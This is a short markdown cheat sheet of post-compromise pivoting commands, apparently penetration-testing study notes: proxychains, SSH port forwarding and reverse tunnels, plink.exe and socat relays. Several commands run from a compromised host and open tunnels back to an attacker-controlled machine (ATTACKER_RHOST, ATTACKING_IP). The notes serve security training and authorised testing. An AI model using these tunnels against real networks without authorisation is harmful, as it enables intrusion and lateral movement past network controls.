# pivoting

## 2 types

1. Tunnelling/Proxying
2. Port Forwarding

## proxychains

config file: `/etc/proxychains.conf`

## ssh forward port forwarding

```
ssh -L <COMPROMISED_LPORT>:<TARGET_RHOST>:<TARGET_RPORT> user@<COMPROMISED_LHOST> -fN
```

## ssh forward proxy

```
ssh -D <COMPROMISED_LPORT> <USER>@<COMPROMISED_LHOST> -fN
```

## ssh reverse connection

```
# on your machine
ssh-keygen
vim ~/.ssh/authorized_keys
command="echo 'This account can only be used for port forwarding'",no-agent-forwarding,no-x11-forwarding,no-pty <ID_RSA.PUB>

# on target machine
sudo systemctl status ssh # sudo systemctl start ssh
ssh -R <COMPROMISED_LPORT>:<TARGET_RHOST>:<TARGET_RPORT> <USERNAME>@<ATTACKER_RHOST> -i <KEYFILE> -fN
# or ssh -R <COMPROMISED_LPORT> <USERNAME>@<ATTACKER_RHOST> -i <KEYFILE> -fN
```

## plink.exe

[https://www.chiark.greenend.org.uk/~sgtatham/putty/latest.html](https://www.chiark.greenend.org.uk/~sgtatham/putty/latest.html)

```
cmd.exe /c echo y | .\plink.exe -R LOCAL_PORT:TARGET_IP:TARGET_PORT USERNAME@ATTACKING_IP -i KEYFILE -N
```

Note that any keys generated by `ssh-keygen` will not work properly here. You will need to convert them using the `puttygen` tool, which can be installed on Kali using `sudo apt install putty-tools`. After downloading the tool, conversion can be done with: `puttygen KEYFILE -o OUTPUT_KEY.ppk`
Substituting in a valid file for the keyfile, and adding in the output file.

## socat

[linux](https://github.com/andrew-d/static-binaries/raw/master/binaries/linux/x86_64/socat)
[windows](https://sourceforge.net/projects/unix-utils/files/socat/1.7.3.2/socat-1.7.3.2-1-x86_64.zip/download)

```
./socat tcp-l:8000 tcp:ATTACKING_IP:443 &
./socat tcp-l:<COMPROMISED_LPORT>,fork,reuseaddr tcp:<TARGET_RHOST>:<TARGET_RPORT> &
```